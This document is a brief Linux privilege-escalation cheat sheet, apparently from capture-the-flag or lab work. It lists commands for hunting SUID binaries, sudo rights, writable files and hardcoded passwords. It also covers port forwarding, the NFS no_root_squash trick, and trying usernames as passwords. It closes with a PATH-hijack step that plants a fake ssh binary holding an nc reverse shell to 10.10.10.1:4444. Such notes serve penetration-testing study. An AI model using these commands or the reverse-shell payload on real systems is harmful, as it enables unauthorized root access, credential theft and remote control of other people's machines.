For when you are stuck

First try simple sudo:

    sudo su -
Try su as all users and the username as password

scan for SUID commands you can run:

    find / -perm -u=s -type f 2>/dev/null
    sudo -l

(look for binaries that will allow you to cheat yourself into root shell, doas, crontab, custom binaries etc)

To find all files that are world writeable, irrespective of what other permissions they have:

    find / -perm -o+w

When running sudo -l remember to carefully look at what is returned eg

    /usr/bin/vi /var/www/html/*

See if you're a member of any groups and check what that group can access

    id
    find / -group adm 2> /dev/null

See if there MORE web directories hosted that you were unable to enumerate.
/etc/apache2/ports.conf show another website? Two ways to port forward, locally from inside machine or by using SSH proxy if you have creds:
Let's say ports.conf is listening locally on 127.0.0.1:8080 (if you find there is another webpage running it's conf may be in opt)

    socat TCP-LISTEN:5000,fork,reuseaddr tcp:127.0.0.1:8080

    ssh -L 8080:localhost:8080 user@machine
password: password

Always run the below in /home/ and /var/www/

    find . -type f -iname "*password*"

If /etc/exports if writable, you can add an NFS entry or change and existing entry adding the no_root_squash flag to a root directory, put a binary with SUID bit on, and get root.

Find apps installed;

    ls -alh /usr/bin/; ls -alh /sbin/; dpkg -l; rpm -qa; ls -alh /var/cache/apt/archivesO; ls -alh /var/cache/yum/*;
Find writable configuration files

    find /etc/ -writable -type f 2>/dev/null

Grep hardcoded passwords

    grep -i user [filename]
    grep -i pass [filename]
    grep -C 5 "password" [filename]
    find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"

if you can just change PATH, the following will add a poisoned ssh binary:

    set PATH="/tmp:/usr/local/bin:/usr/bin:/bin"
    echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.1 4444 >/tmp/f" >> /tmp/ssh
    chmod +x ssh
